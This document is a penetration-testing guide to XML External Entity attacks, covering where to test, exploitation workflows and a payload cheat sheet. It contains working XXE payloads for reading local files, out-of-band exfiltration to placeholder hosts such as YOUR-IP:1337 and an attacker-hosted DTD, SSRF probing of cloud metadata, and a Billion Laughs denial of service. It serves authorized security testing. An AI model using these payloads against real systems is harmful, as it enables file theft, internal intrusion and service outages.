# XML External Entity (XXE)

## 1. What is XXE
XML External Entity (XXE) is a vulnerability in XML parsers that allow attacker-controlled external entities to be processed. When enabled, XXE can be used to:

- Read local files on the server (file disclosure)
- Perform SSRF to internal services
- Exfiltrate data out-of-band (OOB)
- Cause denial of service via entity expansion (Billion Laughs)
- Bypass controls and escalate to further compromise

XXE is common in SOAP APIs, SAML/SOAP SSO integrations, XML upload processors, SVG/XML image handlers and any endpoint that parses XML.

---

## 2. Where to test 
- SOAP APIs and XML-based REST endpoints  
- SAML assertion endpoints and SSO integrations  
- File upload handlers that accept .xml, .svg, .plist, .wsdl, etc.  
- Import/transform endpoints (XML → HTML/PDF) and preview/render features  
- Internal integrations that accept XML from third-party services

When testing, assume XML may be processed by server-side libraries with default, insecure parser settings.

---

## 3. how XXE works 
- XML supports DTDs (Document Type Definitions) and entities. An external entity can reference a file or URL.
- If the parser resolves external entities and returns their content into the parsed document, attacker-supplied entities can force the parser to fetch local files (file://), remote URLs (http://), or use protocol handlers (php://, file://, data://).
- Some parsers allow parameter entities and recursive expansion, enabling OOB exfil and DoS (entity expansion).

---

## 4. Detection — quick probes
Start non-destructively and observe responses or OOB callbacks.

A. In-band (direct) test — file read:
- Inject an external entity referencing a known local file and place it where parser output will be visible.
- Example DTD + XML (basic):
  ```
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <request><name>&xxe;</name></request>
  ```
- If the response or error contains file contents, XXE is confirmed.

B. Blind / Out-of-band (OOB) test:
- Point an external entity to your HTTP listener (Burp Collaborator, http://YOUR-IP:PORT/).
- Example:
  ```
  <!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://YOUR-IP:1337/evil.dtd">
    %xxe;
  ]>
  ```
- Or inline:
  ```
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://YOUR-IP:1337/">
  ]>
  <req>&xxe;</req>
  ```
- If your listener receives a request, XXE is confirmed even without a visible response.

C. Parser behavior tests:
- Try a simple `<!ENTITY xxe SYSTEM "file:///etc/hostname">` to minimize noise.
- If errors leak stack traces or file paths, that helps fingerprint parser and parsing options.

---

## 5. Exploitation — step-by-step workflows

### A. In-band file disclosure (direct)
1. Intercept the XML request with Burp.  
2. Replace or inject a DTD with an external entity that references a local file:
   ```
   <!DOCTYPE data [
     <!ELEMENT data ANY>
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <data>&xxe;</data>
   ```
3. Resend request and inspect response for file contents.

Evidence: request, modified XML, response showing file contents or parsed fragment.

---

### B. Blind / Out-of-band (OOB) exfiltration
1. Start a listener (Burp Collaborator, netcat + web server, httpbin, etc.).  
2. Host any necessary external DTDs if required (see advanced DTD technique).  
3. Inject DTD referencing your listener:
   ```
   <!DOCTYPE foo [
     <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
     <!ENTITY % exfil SYSTEM "http://YOUR-IP:1337/?data=%file;">
     %exfil;
   ]>
   <data>placeholder</data>
   ```
4. Check listener for incoming request containing base64 data; decode to get file contents.

Notes: Use base64 when parser or network strips binary/newline characters.

---

### C. SSRF / Internal network probing
1. Inject entity referencing internal addresses:
   ```
   <!DOCTYPE foo [
     <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/secret">
   ]>
   <req>&xxe;</req>
   ```
2. Observe parser behavior or OOB callbacks; use iterative port payloads to detect open service endpoints.

Use Burp Intruder to iterate ports (1–65535) or common internal endpoints (169.254.169.254 for cloud metadata).

---

### D. Entity expansion DoS (Billion Laughs)
1. Test parser resilience safely with small expansions first. Do not run large expansions against production without permission.
2. Sample payload (concept):
   ```
   <!DOCTYPE lolz [
     <!ENTITY a "lol">
     <!ENTITY b "&a;&a;&a;&a;&a;">
     <!ENTITY c "&b;&b;&b;&b;&b;">
   ]>
   <data>&c;</data>
   ```
3. If parser expands recursively without limits, it may exhaust memory/CPU — DoS confirmed.

---

## 6. Advanced techniques and protocol handlers
- Use `php://filter/convert.base64-encode/resource=` to retrieve PHP source in environments where `file://` might be restricted.
- Use `expect://` (rare, dangerous) or other protocol handlers depending on platform.
- Use external DTD chaining to bypass filters: store larger logic on attacker-hosted DTD and reference it with `<!DOCTYPE doc SYSTEM "http://attacker/dtd">`.

---

## 7. Common payloads (cheat sheet)

- Basic file read:
  ```
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ```
- Blind OOB:
  ```
  <!ENTITY xxe SYSTEM "http://YOUR-IP:1337/">
  ```
- External DTD:
  ```
  <!DOCTYPE foo SYSTEM "http://YOUR-IP:1337/payload.dtd">
  ```
- PHP filter (base64):
  ```
  <!ENTITY f SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  ```
- Billion Laughs (DoS concept):
  ```
  <!ENTITY a "X">
  <!ENTITY b "&a;&a;&a;&a;&a;">
  ...
  ```

Adapt encoding and whitespace to parser tolerance; some platforms require URL-encoding or different DOCTYPE placement.

---

## 8. Detection and validation checklist
- Does the endpoint accept XML inputs or files? (SAML, SOAP, XML upload)  
- Can you inject a `<!DOCTYPE ...>` block? Some APIs strip it — try alternative placements.  
- Does injection produce immediate content in responses? If not, switch to OOB testing.  
- Host minimal external DTDs and use base64 wrappers to capture binary safely.  
- For SSRF: test internal IPs (127.0.0.1, 169.254.169.254, 10.x.x.x, 172.16.x.x, 192.168.x.x).  
- For DoS: test expansion on a dev instance or with permission; avoid production impact.

Capture:
- Original request, modified request, server response, OOB listener logs (headers, referrer, user agent), timestamps.

---
